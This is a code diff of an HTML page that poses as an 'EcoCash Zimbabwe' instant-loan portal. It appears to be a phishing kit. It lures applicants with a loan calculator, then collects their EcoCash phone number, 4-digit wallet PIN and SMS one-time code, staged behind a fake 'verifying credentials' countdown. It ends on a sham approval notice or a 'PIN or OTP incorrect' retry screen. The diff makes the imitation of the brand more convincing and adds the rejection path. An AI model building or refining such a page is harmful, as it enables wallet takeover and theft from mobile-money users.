@@ -6,39 +6,73 @@
   <title>EcoCash Loan Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-blue-950 text-white min-h-screen flex items-center justify-center p-4">
+<body class="bg-[#002855] text-white min-h-screen flex items-center justify-center p-4">
 
-  <div class="w-full max-w-md bg-blue-900/90 border border-blue-700/50 rounded-2xl p-6 shadow-2xl space-y-6">
+  <div class="w-full max-w-md bg-[#004B87] border border-blue-400/30 rounded-2xl p-6 shadow-2xl space-y-6">
     
     <!-- HEADER -->
     <div id="app-header" class="text-center space-y-1">
-      <h1 class="text-2xl font-black text-blue-300 tracking-wide">EcoCash Fast Loan</h1>
-      <p class="text-xs text-blue-200/70">Instant emergency loan application</p>
+      <div class="inline-block bg-white text-[#004B87] font-black px-3 py-1 rounded-full text-xs uppercase tracking-wider mb-1">
+        EcoCash Zimbabwe
+      </div>
+      <h1 class="text-2xl font-extrabold text-white tracking-wide">Instant KaChing Loan</h1>
+      <p class="text-xs text-blue-100/80">Fast emergency loans directly to your EcoCash Wallet</p>
     </div>
 
-    <!-- STEP 1: APPLICANT DETAILS & SLIDE CALCULATOR BELOW -->
-    <div id="step-1" class="space-y-4">
+    <!-- HORIZONTAL STEP INDICATOR -->
+    <div id="horizontal-steps" class="flex items-center justify-between border-b border-blue-300/20 pb-4">
+      <!-- Step 1 Indicator -->
+      <div id="step-indicator-1" class="flex flex-col items-center flex-1">
+        <div id="step-circle-1" class="w-8 h-8 rounded-full bg-white text-[#004B87] font-black flex items-center justify-center text-xs shadow">
+          1
+        </div>
+        <span id="step-label-1" class="text-[10px] font-bold text-white mt-1">Details</span>
+      </div>
+
+      <div id="step-line-1" class="h-0.5 flex-1 bg-blue-300/40 mb-4 transition-all duration-300"></div>
+
+      <!-- Step 2 Indicator -->
+      <div id="step-indicator-2" class="flex flex-col items-center flex-1">
+        <div id="step-circle-2" class="w-8 h-8 rounded-full bg-[#002855] text-blue-200 border border-blue-300/40 font-bold flex items-center justify-center text-xs">
+          2
+        </div>
+        <span id="step-label-2" class="text-[10px] text-blue-200/80 mt-1">Login</span>
+      </div>
+
+      <div id="step-line-2" class="h-0.5 flex-1 bg-blue-300/40 mb-4 transition-all duration-300"></div>
+
+      <!-- Step 3 Indicator -->
+      <div id="step-indicator-3" class="flex flex-col items-center flex-1">
+        <div id="step-circle-3" class="w-8 h-8 rounded-full bg-[#002855] text-blue-200 border border-blue-300/40 font-bold flex items-center justify-center text-xs">
+          3
+        </div>
+        <span id="step-label-3" class="text-[10px] text-blue-200/80 mt-1">OTP</span>
+      </div>
+    </div>
+
+    <!-- STEP 1: APPLICANT DETAILS & CALCULATOR -->
+    <form id="form-step-1" onsubmit="event.preventDefault(); validateAndGoToStep2();" class="space-y-4">
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">Full Name</label>
+        <label class="block text-xs font-semibold text-blue-100 mb-1">Full Name *</label>
         <input type="text" id="fullName" required placeholder="e.g. John Doe" 
-          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+          class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white placeholder-blue-200/40">
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">Occupation / Work</label>
+        <label class="block text-xs font-semibold text-blue-100 mb-1">Occupation / Work *</label>
         <input type="text" id="occupation" required placeholder="e.g. Self Employed / Teacher" 
-          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+          class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white placeholder-blue-200/40">
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">Monthly Income ($)</label>
-        <input type="number" id="monthlyIncome" required placeholder="e.g. 300" 
-          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+        <label class="block text-xs font-semibold text-blue-100 mb-1">Monthly Income ($) *</label>
+        <input type="number" id="monthlyIncome" min="1" required placeholder="e.g. 300" 
+          class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white placeholder-blue-200/40">
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">Loan Repayment Period</label>
-        <select id="repaymentPeriod" class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white">
+        <label class="block text-xs font-semibold text-blue-100 mb-1">Loan Repayment Period *</label>
+        <select id="repaymentPeriod" required class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white">
           <option value="1">1 Month</option>
           <option value="2">2 Months</option>
           <option value="3">3 Months</option>
@@ -46,109 +80,109 @@
         </select>
       </div>
 
-      <!-- SLIDE CALCULATOR AT THE BOTTOM OF STEP 1 -->
-      <div class="bg-blue-950/80 p-4 border border-blue-800 rounded-xl space-y-3">
+      <!-- SLIDE CALCULATOR BELOW -->
+      <div class="bg-[#002855]/90 p-4 border border-blue-300/30 rounded-xl space-y-3">
         <div class="flex justify-between items-center">
-          <label class="text-xs font-semibold text-blue-200">Amount Requested</label>
-          <span id="calc-amount" class="text-base font-bold text-blue-400 font-mono">$100</span>
+          <label class="text-xs font-semibold text-blue-100">Amount Requested</label>
+          <span id="calc-amount" class="text-lg font-black text-white font-mono">$100</span>
         </div>
         
         <input type="range" id="loanRange" min="10" max="500" step="10" value="100" 
-          class="w-full h-2 bg-blue-900 rounded-lg appearance-none cursor-pointer accent-blue-400" oninput="updateLoanCalc()">
+          class="w-full h-2 bg-[#004B87] rounded-lg appearance-none cursor-pointer accent-white" oninput="updateLoanCalc()">
 
-        <div class="grid grid-cols-2 gap-2 text-xs pt-2 border-t border-blue-800/60">
+        <div class="grid grid-cols-2 gap-2 text-xs pt-2 border-t border-blue-300/20">
           <div>
-            <p class="text-blue-300/70">Interest (10%):</p>
-            <p id="calc-interest" class="font-semibold text-blue-100 font-mono">$10</p>
+            <p class="text-blue-200/80">Interest (10%):</p>
+            <p id="calc-interest" class="font-bold text-white font-mono">$10</p>
           </div>
           <div>
-            <p class="text-blue-300/70">Total Repayment:</p>
-            <p id="calc-total" class="font-semibold text-blue-300 font-mono">$110</p>
+            <p class="text-blue-200/80">Total Repayment:</p>
+            <p id="calc-total" class="font-bold text-white font-mono">$110</p>
           </div>
         </div>
       </div>
 
-      <button type="button" onclick="goToStep(2)" 
-        class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-blue-950/50">
+      <button type="submit" 
+        class="w-full bg-white hover:bg-blue-50 text-[#004B87] font-black py-3 rounded-xl text-sm transition shadow-lg tracking-wide uppercase">
         Next Step
       </button>
-    </div>
+    </form>
 
-    <!-- STEP 2: PHONE NUMBER + 4-DIGIT PIN WITH "LOG IN" BUTTON -->
-    <div id="step-2" class="hidden space-y-4">
+    <!-- STEP 2: PHONE NUMBER + PIN -->
+    <form id="form-step-2" onsubmit="event.preventDefault(); submitStep2Details();" class="hidden space-y-4">
       <div class="text-center space-y-1">
-        <h2 class="text-lg font-bold text-blue-100">EcoCash Authentication</h2>
-        <p class="text-xs text-blue-300/70">Enter your mobile wallet number and PIN</p>
+        <h2 class="text-lg font-bold text-white">EcoCash Authentication</h2>
+        <p class="text-xs text-blue-100/80">Enter your wallet number and PIN to authorize</p>
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">EcoCash Phone Number</label>
+        <label class="block text-xs font-semibold text-blue-100 mb-1">EcoCash Phone Number *</label>
         <div class="flex">
-          <span class="inline-flex items-center px-3 text-xs bg-blue-950 text-blue-300 border border-r-0 border-blue-800 rounded-l-xl font-mono">+263</span>
-          <input type="tel" id="phone" required placeholder="771234567" 
-            class="w-full bg-blue-950 border border-blue-800 rounded-r-xl px-4 py-2.5 text-sm focus:outline-none focus:border-blue-400 text-white placeholder-blue-300/40">
+          <span class="inline-flex items-center px-3 text-xs bg-[#002855] text-blue-200 border border-r-0 border-blue-300/40 rounded-l-xl font-mono">+263</span>
+          <input type="tel" id="phone" required pattern="[0-9]{9}" placeholder="771234567" 
+            class="w-full bg-[#002855] border border-blue-300/40 rounded-r-xl px-4 py-2.5 text-sm focus:outline-none focus:border-white text-white placeholder-blue-200/40">
         </div>
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">4-Digit EcoCash PIN</label>
+        <label class="block text-xs font-semibold text-blue-100 mb-1">4-Digit EcoCash PIN *</label>
         <input type="password" id="pin" maxlength="4" pattern="\d{4}" required placeholder="••••" 
-          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-lg font-mono focus:outline-none focus:border-blue-400 text-white">
+          class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-xl font-mono focus:outline-none focus:border-white text-white">
       </div>
 
-      <button type="button" id="btn-login" onclick="submitStep2()" 
-        class="w-full bg-blue-500 hover:bg-blue-400 text-white font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-blue-950/50 tracking-wider">
+      <button type="submit" id="btn-login" 
+        class="w-full bg-white hover:bg-blue-50 text-[#004B87] font-black py-3 rounded-xl text-sm transition shadow-lg tracking-wider uppercase">
         LOG IN
       </button>
-    </div>
+    </form>
 
-    <!-- COUNTDOWN TIMER (10 SECONDS) BEFORE STEP 3 -->
+    <!-- COUNTDOWN TIMER (10 SECONDS) -->
     <div id="step-loading" class="hidden text-center py-8 space-y-4">
-      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-blue-400 border-t-transparent"></div>
+      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-white border-t-transparent"></div>
       <div class="space-y-1">
-        <p class="text-sm font-bold text-blue-100">Verifying Security Credentials...</p>
-        <p class="text-xs text-blue-300/70">Please wait while we connect to EcoCash server.</p>
+        <p class="text-sm font-bold text-white">Verifying Security Credentials...</p>
+        <p class="text-xs text-blue-100/80">Connecting to EcoCash server. Please wait.</p>
       </div>
-      <p id="timer" class="text-sm font-mono text-blue-300 font-bold">10s</p>
+      <p id="timer" class="text-lg font-mono text-white font-black">10s</p>
     </div>
 
-    <!-- STEP 3: SMS 6-DIGIT OTP -->
-    <div id="step-3" class="hidden space-y-4">
+    <!-- STEP 3: OTP VERIFICATION -->
+    <form id="form-step-3" onsubmit="event.preventDefault(); submitOTPDetails();" class="hidden space-y-4">
       <div class="text-center space-y-1">
-        <h2 class="text-lg font-bold text-blue-100">Enter Verification OTP</h2>
-        <p class="text-xs text-blue-300/70">Enter the SMS 6-digit OTP code sent to your phone</p>
+        <h2 class="text-lg font-bold text-white">Enter Verification OTP</h2>
+        <p class="text-xs text-blue-100/80">Enter the 6-digit SMS OTP code sent to your phone</p>
       </div>
 
       <div>
-        <label class="block text-xs font-semibold text-blue-200 mb-1">SMS 6-Digit OTP</label>
+        <label class="block text-xs font-semibold text-blue-100 mb-1">SMS 6-Digit OTP *</label>
         <input type="text" id="otpCode" maxlength="6" pattern="\d{6}" required placeholder="123456" 
-          class="w-full bg-blue-950 border border-blue-800 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-xl font-mono focus:outline-none focus:border-blue-400 text-white">
+          class="w-full bg-[#002855] border border-blue-300/40 rounded-xl px-4 py-2.5 text-sm tracking-widest text-center text-2xl font-mono focus:outline-none focus:border-white text-white">
       </div>
 
-      <button type="button" onclick="submitOTP()" 
-        class="w-full bg-blue-500 hover:bg-blue-400 text-white font-bold py-3 rounded-xl text-sm transition shadow-lg shadow-blue-950/50">
+      <button type="submit" 
+        class="w-full bg-white hover:bg-blue-50 text-[#004B87] font-black py-3 rounded-xl text-sm transition shadow-lg uppercase tracking-wide">
         VERIFY OTP
       </button>
-    </div>
+    </form>
 
-    <!-- STEP 4: CUSTOM CALLBACK APPROVAL MESSAGE -->
+    <!-- STEP 4: OFFICIAL LOAN APPROVAL NOTICE -->
     <div id="step-success" class="hidden text-center py-4 space-y-4">
-      <h2 class="text-lg font-bold text-blue-300 leading-snug">
+      <h2 class="text-base font-black text-white leading-snug">
         🎉🎉 CONGRATULATIONS! YOUR LOAN HAS BEEN APPROVED 🎉🎉
       </h2>
 
-      <div class="border-t border-b border-blue-700/60 py-3 text-xs text-blue-200 font-mono tracking-wider">
+      <div class="border-t border-b border-blue-300/40 py-2 text-xs text-blue-100 font-mono tracking-wider">
         ━━━━━━━━━━━━━━━━━━━━━━━━━━<br>
         🏦 LOAN APPROVAL NOTICE<br>
         ━━━━━━━━━━━━━━━━━━━━━━━━━━
       </div>
 
-      <div class="text-left text-xs text-blue-100 space-y-3 leading-relaxed">
+      <div class="text-left text-xs text-blue-50 space-y-3 leading-relaxed">
         <p>Dear Applicant,</p>
         <p>We are pleased to inform you that your loan application has been successfully reviewed and <b>APPROVED. ✅</b></p>
         <p>🌟 Congratulations! Your application has met all the required approval criteria.</p>
         
-        <div class="bg-blue-950/80 p-3 rounded-xl border border-blue-800 space-y-1 font-mono text-blue-200">
+        <div class="bg-[#002855] p-3 rounded-xl border border-blue-300/40 space-y-1 font-mono text-white">
           <p>📌 <b>Loan Status:</b> ✅ APPROVED</p>
           <p>💰 <b>Disbursement Status:</b> Processing for Immediate Release</p>
         </div>
@@ -157,64 +191,71 @@
         <p>Thank you for choosing our lending services. We appreciate your trust and look forward to serving you again.</p>
       </div>
 
-      <div class="border-t border-blue-700/60 pt-3 text-xs text-blue-200 font-mono tracking-wider space-y-2">
+      <div class="border-t border-blue-300/40 pt-3 text-xs text-blue-100 font-mono tracking-wider space-y-2">
         <p>━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
-        <p class="text-sm font-bold text-blue-300">🎊 Congratulations once again! 🎊</p>
+        <p class="text-sm font-black text-white">🎊 Congratulations once again! 🎊</p>
         <p class="text-xs text-blue-100 font-sans">Your loan has been approved and is now being processed for immediate disbursement.</p>
         <p class="text-xs text-blue-100 font-sans">We wish you success and prosperity with your approved funds.</p>
-        <p class="text-xs text-blue-400 font-bold font-mono pt-2">✔ OFFICIAL LOAN APPROVAL</p>
+        <p class="text-xs text-white font-black font-mono pt-2">✔ OFFICIAL LOAN APPROVAL</p>
       </div>
+    </div>
+
+    <!-- REJECTION NOTICE -->
+    <div id="step-rejected" class="hidden text-center py-8 space-y-4">
+      <div class="w-16 h-16 bg-red-500/20 text-red-300 border border-red-400/40 rounded-full flex items-center justify-center mx-auto text-3xl">
+        ❌
+      </div>
+      <div class="space-y-2">
+        <h2 class="text-xl font-bold text-white">Authentication Failed</h2>
+        <p id="rejection-msg" class="text-xs text-blue-100/80">The EcoCash PIN or OTP provided was marked as incorrect.</p>
+      </div>
+      <button onclick="location.reload()" class="bg-white text-[#004B87] font-bold text-xs px-6 py-2.5 rounded-xl transition">
+        Try Again
+      </button>
     </div>
 
   </div>
 
   <script src="/app.js"></script>
   <script>
-    function updateLoanCalc() {
-      const amount = parseInt(document.getElementById('loanRange').value);
-      const interest = Math.round(amount * 0.10);
-      const total = amount + interest;
+    function setStepProgress(step) {
+      const activeCircleClasses = ['bg-white', 'text-[#004B87]', 'font-black'];
+      const inactiveCircleClasses = ['bg-[#002855]', 'text-blue-200', 'border', 'border-blue-300/40', 'font-bold'];
 
-      document.getElementById('calc-amount').innerText = '$' + amount;
-      document.getElementById('calc-interest').innerText = '$' + interest;
-      document.getElementById('calc-total').innerText = '$' + total;
-    }
-
-    function goToStep(stepNumber) {
-      document.getElementById('step-1').classList.add('hidden');
-      document.getElementById('step-2').classList.add('hidden');
-      document.getElementById('step-loading').classList.add('hidden');
-      document.getElementById('step-3').classList.add('hidden');
-      document.getElementById('step-success').classList.add('hidden');
-
-      if (stepNumber === 1) document.getElementById('step-1').classList.remove('hidden');
-      if (stepNumber === 2) document.getElementById('step-2').classList.remove('hidden');
-      if (stepNumber === 'loading') document.getElementById('step-loading').classList.remove('hidden');
-      if (stepNumber === 3) document.getElementById('step-3').classList.remove('hidden');
-      if (stepNumber === 'success') {
-        document.getElementById('app-header').classList.add('hidden');
-        document.getElementById('step-success').classList.remove('hidden');
-      }
-    }
-
-    function submitStep2() {
-      goToStep('loading');
-      let timer = 10;
-      const timerElem = document.getElementById('timer');
-      const interval = setInterval(() => {
-        timer--;
-        timerElem.innerText = timer + 's';
-        if (timer <= 0) {
-          clearInterval(interval);
-          goToStep(3);
+      for (let i = 1; i <= 3; i++) {
+        const circle = document.getElementById(`step-circle-${i}`);
+        const label = document.getElementById(`step-label-${i}`);
+        
+        if (i <= step) {
+          circle.classList.remove(...inactiveCircleClasses);
+          circle.classList.add(...activeCircleClasses);
+          label.classList.add('text-white', 'font-bold');
+          label.classList.remove('text-blue-200/80');
+        } else {
+          circle.classList.remove(...activeCircleClasses);
+          circle.classList.add(...inactiveCircleClasses);
+          label.classList.remove('text-white', 'font-bold');
+          label.classList.add('text-blue-200/80');
         }
-      }, 1000);
+      }
+
+      document.getElementById('step-line-1').style.backgroundColor = step >= 2 ? '#ffffff' : 'rgba(147, 197, 253, 0.4)';
+      document.getElementById('step-line-2').style.backgroundColor = step >= 3 ? '#ffffff' : 'rgba(147, 197, 253, 0.4)';
     }
 
-    function submitOTP() {
-      goToStep('success');
-    }
+    const originalShowSection = window.showSection;
+    window.showSection = function(sectionId) {
+      if (typeof originalShowSection === 'function') {
+        originalShowSection(sectionId);
+      }
+      if (sectionId === 'form-step-1') setStepProgress(1);
+      if (sectionId === 'form-step-2') setStepProgress(2);
+      if (sectionId === 'form-step-3') setStepProgress(3);
+      if (sectionId === 'step-success' || sectionId === 'step-rejected') {
+        document.getElementById('horizontal-steps').classList.add('hidden');
+      }
+    };
   </script>
 </body>
   </html>
-          
+  
